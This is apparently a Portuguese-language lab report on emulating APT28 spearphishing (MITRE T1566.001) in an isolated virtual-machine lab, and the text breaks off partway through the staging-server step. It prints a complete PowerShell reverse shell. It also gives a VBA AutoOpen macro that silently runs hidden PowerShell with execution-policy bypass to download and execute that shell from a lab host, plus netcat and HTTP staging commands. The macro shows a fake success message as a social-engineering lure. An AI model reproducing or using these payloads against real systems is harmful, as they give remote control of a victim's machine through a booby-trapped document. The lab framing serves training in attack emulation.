## 📋 Sumário Executivo

Este projeto documenta uma simulação controlada de ataque cibernético emulando o grupo APT28 (Fancy Bear), focando na técnica **T1566.001 - Spearphishing Attachment** do framework MITRE ATT&CK. 
O objetivo foi compreender vetores de ataque reais utilizados por threat actors estatais e desenvolver competências práticas em simulação de ataques.

### Destaques do Projeto

- ✅ Emulação fiel de técnica documentada do APT28
- ✅ Laboratório isolado com 2 máquinas virtuais
- ✅ Desenvolvimento de documento malicioso com macro VBA
- ✅ Implementação de reverse shell PowerShell
- ✅ Análise de logs e identificação de IOCs
- ✅ Mapeamento completo ao MITRE ATT&CK Framework

### **Fase 2: Weaponization - Criação do Payload**

#### Payload PowerShell (stage2.ps1)

Desenvolvimento de reverse shell TCP em PowerShell puro, sem dependências externas:

```powershell
# stage2.ps1 - PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.103', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Características Técnicas do Payload:**
- **Linguagem:** PowerShell
- **Conexão:** TCP reversa para contornar firewalls
- **Execução:** Fileless (em memória, sem escrita em disco)
- **Funcionalidade:** Shell interativa completa
- **Evasão:** Sem strings suspeitas óbvias

#### Macro VBA Maliciosa

Desenvolvimento de macro VBA para dropper/downloader:

```vba
' Macro VBA - AutoOpen Trigger
Sub AutoOpen()
    On Error Resume Next
    Dim cmd As String
    
    ' Construir comando PowerShell obfuscado
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass " & _
          "-Command ""IEX (New-Object Net.WebClient)." & _
          "DownloadString('http://192.168.56.103:8000/stage2.ps1')"""
    
    ' Executar payload de forma oculta
    Shell cmd, vbHide
    
    ' Social engineering - mensagem de sucesso
    MsgBox "Documento carregado com sucesso!", vbInformation, "Fatura"
End Sub

' Trigger alternativo para compatibilidade
Sub Document_Open()
    AutoOpen
End Sub
```

**Técnicas Implementadas:**
- ✅ AutoOpen() - execução automática
- ✅ On Error Resume Next - supressão de erros
- ✅ -WindowStyle Hidden - janela invisível
- ✅ -ExecutionPolicy Bypass - contornar políticas
- ✅ DownloadString - staging de payload
- ✅ MsgBox - engenharia social

### **Fase 4: Exploitation - Preparação do C2**

#### Command & Control Setup

**Terminal 1 - Netcat Listener:**
```bash
# Iniciar listener na porta 4444
nc -lvnp 4444

# Flags explicadas:
# -l: listen mode (passivo)
# -v: verbose (output detalhado)
# -n: no DNS lookup (mais rápido)
# -p: especificar porta
```

**Terminal 2 - HTTP Server (Payload Staging):**
```bash
# Servir payload via HTTP
cd ~/ataque
python3 -m http.server 8000

# Disponibiliza stage2.ps1 em:
```
